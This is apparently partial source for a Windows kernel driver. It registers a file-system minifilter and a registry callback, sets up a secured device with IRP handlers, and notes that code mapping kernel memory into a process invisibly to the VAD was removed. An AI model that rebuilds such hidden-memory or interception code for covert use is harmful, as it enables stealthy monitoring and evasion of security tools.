NTSTATUS IRP_Close(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS ResolveAPIS() {
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	UNICODE_STRING psGetCurrentProcessId;
	RtlInitUnicodeString(&psGetCurrentProcessId, L"PsGetCurrentProcessId");


	// redcated basically all the code. i would walk and search for MmGetSystemRoutineAddress/FltGetRoutineAddress
	_PsGetCurrentProcessId = (__PsGetCurrentProcessId)(ULONG_PTR)MmGetSystemRoutineAddress(&psGetCurrentProcessId);
	
	return status;
}
/*
* Removed code that mapped kernel memory into a user process that's inaccessible through the VAD
*
*/
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = STATUS_UNSUCCESSFUL;
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "DriverEntry has been called\nName of driver: %wZ\nRegistry path: %wZ\n", 
		&DriverObject->DriverName, RegistryPath);

	UNICODE_STRING usDriverObject;
	UNICODE_STRING DosObject;
	PDEVICE_OBJECT Device = NULL;

	RtlInitUnicodeString(&usDriverObject, DEVICE_NAME);
	RtlInitUnicodeString(&DosObject, DOS_DEVICE_NAME);
	status = IoCreateDeviceSecure(DriverObject, sizeof(DeviceConfig), &usDriverObject, FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN, FALSE, &SDDL_DEVOBJ_SYS_ALL_ADM_ALL, NULL, &Device);
	if (NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateDevice: Device Name %wZ DosDeviceName %wZ\n", &usDriverObject, &DosObject);
	}
	else {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "failed to create device %x\n", status);
		return status;
	}
	status = IoCreateSymbolicLink(&DosObject, &usDriverObject);
	if (NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateSymbolicLink worked %x\n", status);
	}
	else {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IoCreateSymbolicLink failed %x\n", status);
		return status;
	}
	DeviceConfig *Config = GetConfig(Device);
	RtlZeroMemory(Config, sizeof(DeviceConfig));
	__try {
		InitializeListHead(&Config->llRegistryList);
		InitializeListHead(&Config->llFileList);
		KeInitializeSpinLock(&Config->context->SpinLock);

		status = FltRegisterFilter(DriverObject, &FilterRegistration, &hFltFilter);
		if (NT_SUCCESS(status)) {
			status = FltStartFiltering(hFltFilter);
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "FltStartFiltering failed %x\n", status);
			}
		}
		else {
			DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "FltRegisterFilter failed %x\n", status);
		}
		UNICODE_STRING Altitude;
		RtlInitUnicodeString(&Altitude, L"320004");
		status = CmRegisterCallbackEx(&RegistryCallBack, &Altitude, DriverObject, NULL, &liRegistry, NULL);
		if (!NT_SUCCESS(status)) {
			DbgPrint(("CmRegisterCallbackEx failed\n"));
		}

		for (SIZE_T i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i) {
			DriverObject->MajorFunction[i] = IRP_Unknown;
		} 
		DriverObject->MajorFunction[IRP_MJ_CREATE] = IRP_Create;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = IRP_Close;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IRP_DeviceControl;
	//	DriverObject->MajorFunction[IRP_MJ_WRITE] = IRP_Write;
		//DriverObject->MajorFunction[IRP_MJ_READ] = IRP_Read;
		DriverObject->DriverUnload = Unload;
		Device->Flags |= DO_BUFFERED_IO;
		
	
		
		/*
		removed callback code..
		
	*/
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

		DbgPrint(("exception occured in driver entry"));
		status = STATUS_NONCONTINUABLE_EXCEPTION;
	}
	if (NT_SUCCESS(status)) {
		hGlobalDevice = Device;
	}
	
	return status;
}




/*


return (HWND)NtUserGetThreadState(THREADSTATE_ACTIVEWINDOW);


NtUserGetThreadState calls
	   case THREADSTATE_ACTIVEWINDOW:
ret = (DWORD_PTR)UserGetActiveWindow();

UserGetActiveWindow calls
	PTHREADINFO pti;
	PUSER_MESSAGE_QUEUE ThreadQueue;
	pti = PsGetCurrentThreadWin32Thread();
	ThreadQueue = pti->MessageQueue;
	return( ThreadQueue ? (ThreadQueue->spwndActive ? UserHMGetHandle(ThreadQueue->spwndActive) : 0) : 0);
 }

PsGetCurrentThreadWin32Thread() calls        --- exported by nstokrnl
return PsGetCurrentThread()->Tcb.Win32Thread;


*/